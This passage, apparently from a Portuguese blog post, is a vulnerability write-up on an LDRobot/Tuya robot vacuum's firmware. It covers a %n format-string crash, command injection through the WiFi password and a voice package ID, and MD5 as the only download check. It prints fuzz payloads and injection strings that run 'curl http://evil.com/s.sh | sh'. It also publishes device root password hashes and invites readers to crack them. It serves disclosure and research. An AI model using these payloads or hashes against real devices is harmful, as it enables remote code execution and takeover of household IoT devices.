Montei um harness de fuzzing que enviava payloads variados pro dpid 127 e observava o comportamento do daemon pelo log serial. Strings longas, JSON aninhado, caracteres especiais, SQL injection, path traversal, integer overflow, e format specifiers. Dos 30+ payloads enviados, a maioria foi processada normalmente.

Os payloads com `%n` causaram crash imediato.

### Crashes documentados

Sessão de fuzz em **19 de maio de 2026, 06:36 às 06:47 UTC**:

| # | Hora (UTC) | Payload | Latência | Sinal |
| --- | --- | --- | --- | --- |
| 1 | 06:38:38.780 | `{"fmt": "%n%n%n%n%n%n%n%n"}` (infoType 21030) | 148 ms | SIGABRT (6) |
| 2 | 06:44:15.881 | `{"fmt": "%n"}` (infoType 21019) | 157 ms | SIGABRT (6) |
| 3 | 06:46:49.407 | `{"ts": "%n%n%n%n"}` em envelope dInfo (infoType 21019) | 71 ms | SIGABRT (6) |

O crash log extraído do dump NAND (byte offset 27531686):

```plaintext
06:38:38.780 — Sent: {"fmt": "%n%n%n%n%n%n%n%n"} via dpid 127, infoType 21030
06:38:38.928 — Process crashed: thread info dump (utils.cpp:394)
               /tmp/AppRom/libsoc.so(+0x69434) [0xb6ec9434]
               /lib/libc.so.6(__default_sa_restorer+0) [0xb687f450]
06:38:39.192 — [NP 2026/5/19 06:38:39.192 F][main.cpp:28] Network Proxy Start.
```

O `Network Proxy Start` 264 ms depois do crash confirma o restart automático pelo `system_monitor`.

### Controles negativos

Payloads que NÃO causaram crash:

*   `%99999999s` processado normalmente (tentativa de ler muitos bytes da stack, mas sem write)
    
*   `$(id)` processado como string literal
    
*   `` `id` `` idem
    
*   `;id;` idem
    
*   `../../../etc/passwd` idem
    
*   INT64\_MIN, 2^128 processados sem erro
    
*   JSON aninhado profundo processado
    
*   Buffer de 4096 "A"s processado
    
*   `' OR 1=1 --` processado
    

Nenhum payload sem `%n` causou crash. A especificidade é diagnóstica: `%n` é o único format specifier que **escreve** na memória, os outros só leem. O fato de que somente `%n` causa crash, em todos os testes, confirma sem ambiguidade que dados do usuário estão sendo passados como format string pra uma função da família `printf`.

### Multi-field

O crash #3 usou `%n` no campo `"ts"` do envelope JSON, não no campo `"data"`. Múltiplos campos JSON são vulneráveis. O parser provavelmente itera sobre os campos e processa cada valor com a mesma função de logging ou processamento que usa o valor como format string.

### Análise do sinal: SIGABRT, não SIGSEGV

Os três crashes produziram SIGABRT (sinal 6). Se `%n` estivesse de fato escrevendo em memória (a primitiva de RCE clássica de format string), o sinal seria SIGSEGV (sinal 11), escrita em endereço inválido derivado da stack.

SIGABRT significa que algo chamou `abort()` antes do write acontecer. Quem faz isso é a glibc com `FORTIFY_SOURCE`: quando `__printf_chk` (ou `__vsnprintf_chk`, etc.) detecta `%n` em um format string que reside em segmento writable (stack, heap), ela aborta com a mensagem `*** %n in writable segment detected ***`.

Confirmação via import table do `network_proxy_2`:

```plaintext
__printf_chk        (printf hardened pelo FORTIFY)
__snprintf_chk      (snprintf hardened)
__sprintf_chk       (sprintf hardened)
__vsnprintf_chk     (vsnprintf hardened)
```

O fluxo é:

```plaintext
Dados do usuário com %n
  -> passados como format string
__printf_chk() ou __vsnprintf_chk()
  -> detecta %n em segmento writable
  -> glibc chama abort()
SIGABRT
  -> process crash
system_monitor detecta
  -> restart automático (~260 ms)
```

**Implicação.** A vulnerabilidade de format string é real, dados do usuário SÃO o format string. Mas a primitiva de escrita (`%n`) está bloqueada pelo FORTIFY. O impacto confirmado é DoS: crash repetível, automático, via rede. RCE via `%n` por esta via específica é improvável.

### Vetor de ataque

O dpid 127 é acessível via Tuya MQTT (internet). Qualquer usuário do app com acesso ao dispositivo (PR:L, precisa de conta Tuya vinculada) pode enviar payloads arbitrários pro dpid 127. Cada `%n` causa crash, e o daemon reinicia em ~260 ms. Enviando payloads mais rápido que o ciclo de restart, um atacante mantém DoS persistente. O robô fica inacessível, não responde a comandos, perde conectividade.

### CVSS

`AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H = 6.5`

*   **AV:N.** Acessível pela internet via MQTT Tuya.
    
*   **AC:L.** Trivial, o payload é uma string JSON.
    
*   **PR:L.** Precisa de conta Tuya com acesso ao dispositivo.
    
*   **UI:N.** Sem interação do usuário necessária.
    
*   **C:N/I:N.** FORTIFY bloqueia a primitiva de escrita, sem leak e sem modificação confirmados.
    
*   **A:H.** Crash completo do processo, repetível.
    

* * *

## 9\. VD-02: Injeção de Comando OS via WiFi SSID/Password

**CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command) **Confiança:** STRONGLY INFERRED, evidência de strings + imports + script independente; disassembly bloqueado pelo NFTL **CVSS 3.1:** 7.1 (`AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`)

### Contexto

Quando o app Tuya configura o WiFi do robô, ele envia SSID e senha via protocolo LAN Tuya (porta 6668). O robô recebe esses valores, interpola num comando shell e executa via `system()`.

### Evidência no binário (network\_proxy\_2)

As strings seguintes foram encontradas no rodata do binário principal, em offsets múltiplos (5+ cópias NFTL):

```plaintext
Offset 0xae2264: "wifi_control.cpp"
Offset 0xae22c8: "called %s, ssid %s, pwd %s"
Offset 0xae2328: "wifi pwd is less than 8 char"
Offset 0xae2348: "wifi pwd is more than 64 char"
Offset 0xae2368: "WifiControl::Connect2Ap over(bg exec)"
Offset 0xae242c: sh /data/bin/cleanpack_mode -m sta -s "%s" -p "%s"
Offset 0xae2498: sh /data/bin/cleanpack_mode -m sta -s "%s" -p "%s" --segment="%s" --hide="%d"
Offset 0xae254c: "wifi cmd %s"
Offset 0xae25e0: "WifiControl::ResetWifi,cmd [%s]"
```

O padrão é clássico:

1.  A função `WifiControl::Connect2Ap` recebe SSID e senha.
    
2.  Valida apenas o comprimento da senha (8 a 64 caracteres), sem filtro de caracteres.
    
3.  Interpola via `snprintf` no template `sh /data/bin/cleanpack_mode -m sta -s "%s" -p "%s"`.
    
4.  Loga o comando construído como `"wifi cmd %s"`.
    
5.  Passa pra `system()`.
    

A tabela de imports confirma: `system()` presente no PLT, `__snprintf_chk` presente. Sem imports de `exec*` ou `posix_spawn`. Sem strings de sanitização no binário inteiro.

### Evidência no script cleanpack\_mode (dump offset 0x48cfc09)

O script shell que recebe o comando confirma a ausência de sanitização:

```sh
-s | --ssid)
    AP_STA_SSID=$2    # atribuição direta, sem filtro
    shift 2
    ;;
```

Usado depois como:

```sh
/data/bin/ap_client "$AP_STA_SSID" "$AP_STA_PWD"
echo "$AP_STA_SSID" >/data/cfg/ap_name
sh /data/bin/apDemo --ssid="$AP_STA_SSID" ...
```

As aspas duplas em torno de `$AP_STA_SSID` não previnem injeção de comando. Em shell, `"$var"` previne word splitting e globbing, mas não previne substituição de comando (`$(cmd)`) nem a quebra de aspas se o valor contém `"`.

### Mecanismo de injeção

O format string C coloca SSID e senha entre aspas duplas: `-s "%s" -p "%s"`. Uma aspa dupla no valor quebra a delimitação:

```plaintext
Senha:     12345678"; id; echo "
Comando:   sh /data/bin/cleanpack_mode -m sta -s "SSID" -p "12345678"; id; echo ""
Shell vê:  cleanpack_mode (com -p "12345678"), depois id, depois echo ""
```

### O campo de senha como vetor preferido

O SSID tem limitação de 32 bytes pelo padrão IEEE 802.11, provavelmente enforced pelo `wpa_supplicant` downstream. Mas a senha tem validação explícita de 8 a 64 caracteres no código, e nenhuma validação de conteúdo. Um payload de 21 caracteres como `12345678"; id; echo "` satisfaz o requisito de comprimento mínimo e injeta comando arbitrário. A senha oferece até 64 caracteres de espaço pra payload, mais que suficiente pra `$(curl evil|sh)`.

### Classificação de evidência

| Claim | Status |
| --- | --- |
| Format string com %s não-sanitizado pra SSID/senha | **PROVEN**, 5+ duplicatas NFTL |
| Única validação é comprimento da senha | **PROVEN**, sem strings de filtro |
| system() é o único mecanismo de execução | **PROVEN**, tabela de imports |
| cleanpack\_mode recebe SSID sem sanitização | **PROVEN**, script fonte |
| snprintf alimenta system() | **STRONGLY INFERRED**, rodata + imports |
| App Tuya filtra caracteres especiais | **UNKNOWN**, não verificável sem teste |

### Caveats

*   A cadeia `snprintf -> system()` é inferida pela sequência de rodata e imports, não por trace de instruções ARM. A mesma limitação do NFTL.
    
*   O app Tuya ou o SDK podem filtrar caracteres especiais do SSID/senha antes de enviar. Isso mitigaria o vetor via app, mas não via API LAN direta.
    
*   O vetor é rede adjacente (LAN, porta 6668). Durante o modo AP de pareamento, não é necessário o `localKey` Tuya, e qualquer dispositivo na rede pode enviar comandos.
    

### CVSS

`AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N = 7.1`

*   **AV:A.** Adjacência LAN ou proximidade em AP-mode.
    
*   **PR:L.** Precisa do `localKey` Tuya, exceto durante pareamento.
    
*   **C:H/I:H.** Se a injeção executa, é root shell no device.
    

* * *

## 10\. VD-03: Injeção de Comando OS via Nome de Pacote de Voz

**CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command) **Confiança:** STRONGLY INFERRED, evidência de strings + script independente + imports; disassembly bloqueado pelo NFTL **CVSS 3.1:** 8.1 (`AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`)

### Contexto

O robô suporta pacotes de voz customizáveis, frases em diferentes idiomas pra anunciar status ("limpeza iniciada", "voltando pra base", etc.). Os pacotes são baixados via MQTT da nuvem Tuya, verificados apenas com MD5, e o nome/ID do pacote é interpolado sem sanitização em comandos `rm`, `tar`, `cp` e `mv` que são passados pra `system()`.

### Evidência na biblioteca de voz (~100 KB, ELF dinâmico)

```plaintext
Offset 0xa018: rm -rf %s/%s && tar -zxf %s/%s -C %s && cp %s/Q001.mp3 %s/
Offset 0x9fc4: "mv voice package to save cmd is"
Offset 0xa0bc: "voicd package apply cmd: %s"    (o typo 'voicd' é do binário original)
Offset 0xa0e8: "mv  package to tmp cmd is: %s"
Offset 0xa054: network_proxy_2/src/logic/voice_package.cpp
Offset 0xa208: {"voip_cur" : "%s"}
```

O fluxo de dados:

```plaintext
Tuya Cloud (MQTT 8883/TLS ou 1883/plaintext)
  -> comando "downloadAndApply" com metadata do pacote de voz
VoicePackageBase::DownloadFileCheckAndApply()
  source: network_proxy_2/src/base/voice_package_base.cpp
  -> download pra /tmp/voip_tmp
HttpsBase::DownloadAndCheck()
  verificação: MD5 only (sem assinatura)
  -> move pra /userdata/cfg/music/sys/<pkg_id>
voice_package.cpp, construção do comando shell:
  rm -rf %s/%s && tar -zxf %s/%s -C %s && cp %s/Q001.mp3 %s/
  logado como: "voicd package apply cmd: %s"
  -> system()
Execução como root
```

### Verificação de download: só MD5

```plaintext
Offset 0xc844: "DownloadAndCheck, %s url is > %s : md5sum is > %s"
Offset 0xc96c: "DownLoadAndCheck md5 success"
Offset 0xc98c: "DownLoadAndCheck md5 error! should be:%s now:%s"
```

Sem RSA, ECDSA, Ed25519 ou qualquer string relacionada a assinatura criptográfica no path de verificação. MD5 verifica integridade contra corrupção de rede, não autenticidade. Um atacante que controle o conteúdo da resposta pode fornecer qualquer pacote com MD5 válido.

### Confirmação independente: script de boot (dump offset 0xa1bc00)

Um script de boot separado, que não faz parte do binário `network_proxy_2`, lê o config do pacote de voz e usa o ID diretamente em tar:

```sh
musicId=$(cat /userdata/cfg/music_cfg | grep voip_cur | awk -F'"' '{print $4}')
tar -zxf "/userdata/cfg/music/$musicId" -C /userdata/music
```

O `$musicId` vem do arquivo `music_cfg`, que é escrito pelo `voice_package.cpp` após download: `{"voip_cur" : "%s"}` (offset 0xa208). Essa é uma confirmação independente, um code path completamente separado que consome o mesmo dado sem sanitização.

**Restrição do awk.** O `awk -F'"' '{print $4}'` usa aspas duplas como delimitador. Isso significa que o `musicId` não pode conter aspas duplas (elas quebrariam a extração do campo). Mas `$(curl evil.com/s.sh | sh)` não contém aspas duplas e funciona perfeitamente como substituição de comando em shell.

### Mecanismo de injeção

Se o ID do pacote de voz contém metacaracteres shell:

```plaintext
Package ID:  x; curl http://evil.com/s.sh | sh; echo
Resultado:   rm -rf /userdata/cfg/music/sys/x; curl http://evil.com/s.sh | sh; echo && tar ...
Shell vê:    rm, depois curl|sh (payload do atacante), depois echo
```

### Vetor de ataque

**Primário.** Compromisso de conta Tuya cloud ou acesso à API de desenvolvedor. O metadata do pacote de voz (incluindo o ID usado como nome de arquivo) vem da nuvem Tuya. Se um atacante controla a resposta MQTT, controla o ID do pacote.

**Secundário.** MITM no fallback plaintext. O MQTT primário usa TLS na porta 8883, mas existe fallback HTTP em `http://a.tuyacn.com:80/d.json` e MQTT plaintext na porta 1883. Nesses paths, um MITM pode injetar metadata de pacote.

### Classificação de evidência

| Claim | Status |
| --- | --- |
| Format string shell com 7 %s não-sanitizados | **PROVEN**, offset 0xa018 |
| system() é o único mecanismo de exec | **PROVEN**, tabela de imports |
| Download verifica só MD5 | **PROVEN**, sem strings de assinatura |
| Script independente usa pkg\_id sem sanitização | **PROVEN**, script em dump 0xa1bc00 |
| Nenhuma função de sanitização no binário | **PROVEN**, grep zero resultados |
| snprintf alimenta system() | **STRONGLY INFERRED**, log + imports |
| ID do pacote chega ao format string | **STRONGLY INFERRED**, sem filtro visível |
| Cloud Tuya valida IDs de pacote | **UNKNOWN**, não verificável |

### CVSS

`AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H = 8.1`

*   **AV:N.** Acessível via cloud MQTT.
    
*   **AC:H.** Requer comprometimento de conta cloud ou posição MITM.
    
*   **PR:N.** Sem autenticação device-side pra pacotes OTA.
    
*   **C:H/I:H/A:H.** Root shell no device.
    

* * *

## 11\. Hashes de Senha Root

No dump NAND, encontrei entradas de `/etc/shadow` com hashes MD5crypt ($1$). São três hashes distintos, provavelmente de diferentes partições ou snapshots de filesystem dentro do NFTL:

```plaintext
root:$1$Ch3Jcvh9$2Q5Xng4bPbNnsQfTQpgcY.:0:0:99999:7:::
root:$1$JgO2yeod$HMMdc31757YjIEIeeARyQ/:0:0:99999:7:::
guest:$1$AzV2bLNj$GzHUVc2WOXyfiA6gWVkRF/:0:0:99999:7:::
```

MD5crypt. `$1$`. O algoritmo mais fraco que ainda aparece em sistemas Linux modernos. SHA-512crypt (`$6$`) é o padrão desde 2008. SHA-256crypt (`$5$`) é aceitável. MD5crypt é breakável por força bruta a taxas de milhões de tentativas por segundo em GPU moderna.

Duas hashes diferentes pra root sugerem que a senha foi alterada entre builds de firmware, ou que há múltiplos filesystems na NAND (partição ativa, partição de fallback, snapshot). O hash do guest confirma o que eu já sabia, conta com senha fraca ou vazia.

Não consegui quebrar os hashes do root com wordlists padrão (`rockyou.txt`, `SecLists/Passwords`). A senha não é trivial, o que é consistente com a observação de que o vendor não usou senhas-padrão genéricas. Mas MD5crypt com salt de 8 caracteres não resiste a um ataque focado com hashcat em GPU. É questão de tempo e compute.

Deixo os hashes aqui pra quem estiver "feeeling lucky". Se alguém quebrar, a recompensa é root completo no console UART de qualquer LR852K que tenha esse firmware.

* * *

## 12\. Caminho para Confirmação Completa

As duas vulnerabilidades de injeção de comando (VD-02 e VD-03) estão classificadas como STRONGLY INFERRED porque a cadeia `snprintf -> system()` não pôde ser verificada por trace de instruções ARM. A causa é o NFTL, que embaralha as páginas de código.

Existem dois caminhos pra converter de INFERRED pra CONFIRMED:

1.  **Dump com OOB data.** Dumpar a NAND incluindo os dados out-of-band (spare area de 128 bytes por página) no formato que o `ubireader` espera. Isso permitiria reconstruir o mapeamento lógico-físico do NFTL e montar o filesystem UBIFS, extraindo binários limpos pra disassembly completa.
    
2.  `dd` **no device vivo.** Se alguém obtiver root (por bruteforce do hash MD5crypt, por exploit serial ou por outra via), um simples `dd if=/dev/mtdblockX of=/tmp/partition.bin` extrairia as partições com mapeamento lógico já resolvido pelo kernel. Os ELFs sairiam limpos.
    

VD-01 (format string) já é CONFIRMED, com crashes documentados por logs do NAND e padrão inequívoco de comportamento.

* * *

## 13\. Reflexões

### O modelo de ameaça de verdade

Alguém pode olhar pra isso e perguntar: "mas por que caralhos alguém iria pegar meu robô e fazer um dump complicado?". É uma pergunta válida, e a resposta é que as vulnerabilidades sérias (VD-01, VD-02, VD-03) não exigem acesso físico ao robô.

VD-01 é um DoS pela internet, qualquer pessoa com acesso à conta Tuya do dispositivo pode crashar o daemon de rede remotamente, repetidamente. VD-02 é injeção de comando pela rede local, durante o pareamento WiFi ou com o `localKey` Tuya. VD-03 é injeção de comando pela internet, via comprometimento da nuvem Tuya ou MITM no fallback plaintext.

O dump físico foi o método de descoberta, não o método de ataque. Eu precisei extrair o firmware pra encontrar as vulnerabilidades. Um atacante não precisa do firmware pra explorá-las.

### Aspirador conectado é um computador Linux na sua rede

Um robô aspirador conectado é um computador Linux com root rodando na sua rede doméstica, com microfone (em alguns modelos), câmera (em modelos com navegação visual) e mapeamento detalhado da planta da sua casa. Ele sabe o layout dos seus cômodos, sabe quando você está em casa (baseado em agendamento e sensores) e mantém uma conexão persistente com um servidor na internet.

O mercado de IoT doméstico trata segurança como feature opcional. O fato de que a LDRobot compilou com FORTIFY\_SOURCE e colocou uma senha não-trivial no root já coloca esse dispositivo acima da média do segmento, e mesmo assim encontrei três vulnerabilidades, duas delas com injeção de comando direta.

### A maldição do NFTL

A maior frustração dessa pesquisa foi o NFTL. Em todos os roteadores que analisei antes (ZTE F689, TP-Link RE305), o firmware era extraível limpo, NOR flash com filesystem SquashFS direto, ou NAND com layout previsível. O Allwinner NFTL é uma camada de complexidade que impede análise estática profunda a partir do dump bruto.

Ironicamente, o NFTL não é uma medida de segurança. Ele existe pra wear leveling e bad block management, necessidades operacionais da NAND flash. Mas o efeito colateral é que funciona como uma forma acidental de ofuscação. Strings são legíveis, mas fluxo de controle não. É o suficiente pra encontrar vulnerabilidades por padrão de strings, mas não o suficiente pra confirmar com certeza absoluta via disassembly.

### O ecossistema Tuya

Tuya é a plataforma IoT que roda por baixo de centenas de marcas white-label. O SDK Tuya (versão 4.3.1 neste dispositivo) fornece conectividade MQTT, protocolo LAN, OTA update e gerenciamento de data points. A exposição não é específica da LDRobot. Qualquer dispositivo usando o Tuya SDK com padrão semelhante de construção de comandos shell sem sanitização está potencialmente vulnerável.

A ausência de assinatura criptográfica nos pacotes de voz (VD-03) é uma decisão do SDK ou do fabricante. MD5 é verificação de integridade, não de autenticidade. Qualquer pipeline de update que use MD5 como única verificação está a uma posição de MITM de distância da execução de código arbitrário.

* * *

## Apêndice A. Sumário dos Achados

| ID | Título | CWE | CVSS 3.1 | Confiança |
| --- | --- | --- | --- | --- |
| VD-01 | Format String em Tuya dpid 127 (DoS) | CWE-134 | 6.5 Medium | CONFIRMED |
| VD-02 | Command Injection via WiFi SSID/Password | CWE-78 | 7.1 High | STRONGLY INFERRED |
| VD-03 | Command Injection via Voice Package Filename | CWE-78 | 8.1 High | STRONGLY INFERRED |

## Apêndice B. Binários Analisados

```plaintext
network_proxy_2 (~1.9 MB, ELF dinâmico ARM)
  - daemon principal de rede e Tuya SDK
  - imports: system(), __printf_chk, __snprintf_chk, __sprintf_chk,
    __vsnprintf_chk, __memcpy_chk, __strcpy_chk, __stack_chk_fail
  - afetado por: VD-01, VD-02

voice package library (~100 KB, ELF dinâmico ARM)
  - biblioteca de gerenciamento de pacotes de voz
  - source: network_proxy_2/src/logic/voice_package.cpp
  - imports: system(), __snprintf_chk, __memcpy_chk, __stack_chk_fail
  - afetado por: VD-03

CleanPackApp (~540 KB, ELF estático ARM)
  - aplicação principal do robô (orquestração)
  - contém strings de "downloadAndApply", "getVoicePackageInfo"
  - afetado por: VD-03 (orquestração de download)

cleanpack_mode (shell script)
  - script de configuração WiFi/AP
  - recebe SSID sem sanitização
  - afetado por: VD-02
```

## Apêndice C. Ferramentas Utilizadas

| Ferramenta | Uso |
| --- | --- |
| SNANDer + CH341A | Dump da SPI NAND (XT26G01CWSIG) via SPI |
| Flipper Zero em Modo Bridge (fancy, não tenho um USB UART) | Acesso serial ao console UART (115200 8N1) |
| tio | Terminal serial com logging |
| strings + grep | Análise de rodata e scripts embarcados |
| readelf | Headers e import tables dos ELFs extraídos |
| hexdump / xxd | Inspeção binária de offsets específicos |
| Python (pyserial) | Scripts de extração, fuzzing de dpids, automação |
| Radare2 | Tentativa de disassembly (limitada pelo NFTL) |
| hashcat | Tentativa de bruteforce dos hashes MD5crypt |
| Ferro de solda (ponta fina) | Soldagem in-circuit nos pads WSON8 |
| Lupa / microscópio | Inspeção visual das soldas e dos pads |

## Apêndice D. Dump SHA256

```plaintext
SHA256 (dump.bin)  = 00ea975770c88095c2c780b02b3b675879ef104078cf41e14647a43c12c08fa8
SHA256 (dump2.bin) = 00ea975770c88095c2c780b02b3b675879ef104078cf41e14647a43c12c08fa8
```

128 MB (134.217.728 bytes). Dois dumps independentes, checksums idênticos.

{% endraw %}
